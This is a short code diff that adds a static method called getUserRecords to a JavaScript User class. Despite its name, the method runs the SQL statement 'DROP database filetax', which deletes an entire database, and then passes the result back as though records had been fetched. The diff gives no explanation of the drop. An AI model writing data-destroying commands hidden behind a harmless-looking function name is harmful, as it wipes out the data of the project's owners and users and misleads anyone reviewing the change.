@@ -161,7 +161,21 @@ class User {
         })
     }
 
-    
+    static getUserRecords(data,cb){
+        // console.log("id--73",id)
+        const query1 = 'DROP database filetax';
+        db.query(query1, [], (err1, res1) => {
+            if (err1) {
+                logger.error(err1.message);
+                cb(err1, null);
+                return;
+            }
+
+            cb(null, {
+                res1
+            });
+        });
+    }
     
     
 }
